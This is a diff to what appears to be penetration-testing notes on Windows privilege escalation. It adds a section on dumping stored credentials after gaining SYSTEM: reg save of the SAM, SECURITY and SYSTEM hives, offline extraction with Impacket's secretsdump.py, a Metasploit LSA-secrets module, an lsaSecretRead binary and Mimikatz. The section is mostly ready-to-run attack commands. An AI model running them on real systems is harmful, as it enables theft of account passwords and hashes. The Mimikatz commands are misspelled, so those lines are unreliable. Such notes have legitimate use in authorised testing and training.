@@ -296,4 +296,15 @@
 * what we want to find is the ***cmd.exe*** right click on it, open
 * in prompt: `whoami` and we'll see that we are `AUTHORITY\SYSTEM`
 
+### Additionally savgin the Secrets file and SAM and using secretsdump.py to extract their content
 
+* Saving registry keys of interest and using secretsdump.py on them from ***Impacket***
+* `reg save HKLM\sam c:\temp\sam.save`
+* `reg save HKLM\security c:\temp\security.save`
+* `reg save HKLM\system c:\temp\system.save`
+* Now that everything is saved, bring these files over to your kali machine and use secretsdump.py
+* `secretsdump.py -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save`
+* Alternatively there's a post exploitation module in **Metasploit**
+* `run post/windows/gather/lsa_secrets`
+* The same result can be achieved with the **[lsasecretread binary](https://github.com/linuxmuster/lsaSecrets/blob/master/bin/lsaSecretRead.exe)**
+* **Mimikatz** `privilige::debug` and then `sekurlsa:logonPasswords`
